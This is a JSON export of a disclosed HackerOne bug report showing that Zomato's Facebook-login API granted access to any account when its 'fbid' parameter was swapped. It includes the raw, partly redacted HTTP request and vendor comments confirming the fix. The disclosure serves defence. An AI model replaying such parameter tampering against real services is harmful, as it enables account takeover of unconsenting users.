{"id":202921,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDI5MjE=","url":"https://hackerone.com/reports/202921","title":"Unauthorised Access to Anyone's User Account","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-02-02T15:33:35.634Z","submitted_at":"2017-02-02T15:33:35.634Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bhavukjain1","url":"/bhavukjain1","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/133/725/90814423c5ff9907d4e874c78b50d5cf13206cac_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-28T22:13:53.396Z","bug_reporter_agreed_on_going_public_at":"2017-02-26T22:13:48.912Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"When we do Login with Facebook on the Zomato app, you're doing zero authentication of the user. I'm able to hack into the targeted user's accounts by just using the Facebook ID.\n\nAffected API raw request:\n\nPOST /v2/auth.json?presentlat=28.66505699180115\u0026useragent=model_iPod%20touch__os_9.3.5__v_7.0__t_iPod5,1\u0026app_version=7.0\u0026session_id=41\u0026app_run_id=21\u0026presentlon=77.32215271029096\u0026lang=en\u0026push_permission=1\u0026isFacebook=true\u0026channel_url=\u0026uuid=█████████ HTTP/1.1\nHost: 1api.zomato.com\nAccept-Language: en-IN;q=1, nl-IN;q=0.9, it-IN;q=0.8, de-IN;q=0.7, fr-IN;q=0.6\nAccept: */*\nUser-Agent: Zomato/6.6.9 (iPod touch; iOS 9.3.5; Scale/2.00)\nX-Zomato-API-Key: █████████\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nConnection: keep-alive\napp_version: 7.0\nCookie: PHPSESSID=██████████; fbcity=1; fbtrack=c9bce885893ad8387ae3dc855d6f5b97; zl=en\nContent-Length: 984\nAccept-Encoding: gzip\n\naccess_token=\u0026client_id=zomato_ios_v2\u0026fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D\u0026fb_token=████████\u0026fbdata=%7B%0A%20%20%22link%22%20%3A%20%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fapp_scoped_user_id%5C%2F█████%5C%2F%22%2C%0A%20%20%22id%22%20%3A%20%22██████████%22%2C%0A%20%20%22first_name%22%20%3A%20%22Bhavuk%22%2C%0A%20%20%22name%22%20%3A%20%22Bhavuk%20Jain%22%2C%0A%20%20%22gender%22%20%3A%20%22male%22%2C%0A%20%20%22last_name%22%20%3A%20%22Jain%22%2C%0A%20%20%22email%22%20%3A%20%22█████████%40yahoo.co.in%22%2C%0A%20%20%22locale%22%20%3A%20%22en_US%22%2C%0A%20%20%22timezone%22%20%3A%205.5%2C%0A%20%20%22updated_time%22%20%3A%20%222016-12-24T21%3A55%3A30%2B0000%22%2C%0A%20%20%22verified%22%20%3A%20true%0A%7D\u0026fbid=█████\n\nIn the last parameter, \"fbid\", I just need to replace it with the targeted user's facebook id, and I've been given the access to that user account. \nFor eg, just replace the \"fbid\" parameter with ███. You'll gain the access to this user's account.\n\nAlso, using my Facebook access token, I'm able to get the correct facebook ids of the people I'm friends on Facebook with and also the ids of second degree friends as well. So I'm able to hack into their Zomato accounts with ease.","vulnerability_information_html":"\u003cp\u003eWhen we do Login with Facebook on the Zomato app, you\u0026#39;re doing zero authentication of the user. I\u0026#39;m able to hack into the targeted user\u0026#39;s accounts by just using the Facebook ID.\u003c/p\u003e\n\n\u003cp\u003eAffected API raw request:\u003c/p\u003e\n\n\u003cp\u003ePOST /v2/auth.json?presentlat=28.66505699180115\u0026amp;useragent=model_iPod%20touch_\u003cu\u003eos_9.3.5\u003c/u\u003e\u003cu\u003ev_7.0\u003c/u\u003e_t_iPod5,1\u0026amp;app_version=7.0\u0026amp;session_id=41\u0026amp;app_run_id=21\u0026amp;presentlon=77.32215271029096\u0026amp;lang=en\u0026amp;push_permission=1\u0026amp;isFacebook=true\u0026amp;channel_url=\u0026amp;uuid=█████████ HTTP/1.1\u003cbr\u003e\nHost: 1api.zomato.com\u003cbr\u003e\nAccept-Language: en-IN;q=1, nl-IN;q=0.9, it-IN;q=0.8, de-IN;q=0.7, fr-IN;q=0.6\u003cbr\u003e\nAccept: \u003cem\u003e/\u003c/em\u003e\u003cbr\u003e\nUser-Agent: Zomato/6.6.9 (iPod touch; iOS 9.3.5; Scale/2.00)\u003cbr\u003e\nX-Zomato-API-Key: █████████\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\napp_version: 7.0\u003cbr\u003e\nCookie: PHPSESSID=██████████; fbcity=1; fbtrack=c9bce885893ad8387ae3dc855d6f5b97; zl=en\u003cbr\u003e\nContent-Length: 984\u003cbr\u003e\nAccept-Encoding: gzip\u003c/p\u003e\n\n\u003cp\u003eaccess_token=\u0026amp;client_id=zomato_ios_v2\u0026amp;fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D\u0026amp;fb_token=████████\u0026amp;fbdata=%7B%0A%20%20%22link%22%20%3A%20%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fapp_scoped_user_id%5C%2F█████%5C%2F%22%2C%0A%20%20%22id%22%20%3A%20%22██████████%22%2C%0A%20%20%22first_name%22%20%3A%20%22Bhavuk%22%2C%0A%20%20%22name%22%20%3A%20%22Bhavuk%20Jain%22%2C%0A%20%20%22gender%22%20%3A%20%22male%22%2C%0A%20%20%22last_name%22%20%3A%20%22Jain%22%2C%0A%20%20%22email%22%20%3A%20%22█████████%40yahoo.co.in%22%2C%0A%20%20%22locale%22%20%3A%20%22en_US%22%2C%0A%20%20%22timezone%22%20%3A%205.5%2C%0A%20%20%22updated_time%22%20%3A%20%222016-12-24T21%3A55%3A30%2B0000%22%2C%0A%20%20%22verified%22%20%3A%20true%0A%7D\u0026amp;fbid=█████\u003c/p\u003e\n\n\u003cp\u003eIn the last parameter, \u0026quot;fbid\u0026quot;, I just need to replace it with the targeted user\u0026#39;s facebook id, and I\u0026#39;ve been given the access to that user account. \u003cbr\u003e\nFor eg, just replace the \u0026quot;fbid\u0026quot; parameter with ███. You\u0026#39;ll gain the access to this user\u0026#39;s account.\u003c/p\u003e\n\n\u003cp\u003eAlso, using my Facebook access token, I\u0026#39;m able to get the correct facebook ids of the people I\u0026#39;m friends on Facebook with and also the ids of second degree friends as well. So I\u0026#39;m able to hack into their Zomato accounts with ease.\u003c/p\u003e\n","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-28T22:13:48.942Z","allow_singular_disclosure_after":-118478418.64091742,"singular_disclosure_allowed":true,"vote_count":24,"voters":["delimitry","kushagra","spam404","sameerphad72","flashdisk","bhavukjain1","jon_bottarini","muhammad_uwais","eveeez","linkks","and 14 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1461026,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bhavukjain1 Thanks for bringing this to our notice.\nOur team is in the process of fixing this.","markdown_message":"\u003cp\u003e\u003ca href=\"/bhavukjain1\"\u003e@bhavukjain1\u003c/a\u003e Thanks for bringing this to our notice.\u003cbr\u003e\nOur team is in the process of fixing this.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-03T15:31:39.737Z","updated_at":"2017-02-03T15:31:39.737Z","actor":{"username":"shrey","cleared":false,"url":"/shrey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1475991,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update on the issue?","markdown_message":"\u003cp\u003eAny update on the issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-09T23:54:07.576Z","updated_at":"2017-02-09T23:54:07.576Z","actor":{"username":"bhavukjain1","cleared":true,"url":"/bhavukjain1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/133/725/90814423c5ff9907d4e874c78b50d5cf13206cac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1493519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's been 17 days now and still, ​I'm able to gain access to user accounts of over 10k people on your app. ","markdown_message":"\u003cp\u003eIt\u0026#39;s been 17 days now and still, ​I\u0026#39;m able to gain access to user accounts of over 10k people on your app. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-19T06:50:55.188Z","updated_at":"2017-02-19T06:50:55.188Z","actor":{"username":"bhavukjain1","cleared":true,"url":"/bhavukjain1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/133/725/90814423c5ff9907d4e874c78b50d5cf13206cac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1505253,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have fixed this issue. Thanks for keeping @Zomato safe.","markdown_message":"\u003cp\u003eWe have fixed this issue. Thanks for keeping \u003ca href=\"/zomato\"\u003e@Zomato\u003c/a\u003e safe.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-25T10:16:37.453Z","updated_at":"2017-02-25T10:16:37.453Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bhavukjain1","url":"/bhavukjain1"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1506933,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can you hide that critical info including the specified fbid before disclosing it?","markdown_message":"\u003cp\u003eCan you hide that critical info including the specified fbid before disclosing it?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-26T22:13:48.924Z","updated_at":"2017-02-26T22:13:48.924Z","first_to_agree":true,"actor":{"username":"bhavukjain1","cleared":true,"url":"/bhavukjain1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/133/725/90814423c5ff9907d4e874c78b50d5cf13206cac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1569122,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-28T22:13:53.427Z","updated_at":"2017-03-28T22:13:53.427Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5206683,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-27T14:51:15.800Z","updated_at":"2019-06-27T14:51:15.800Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}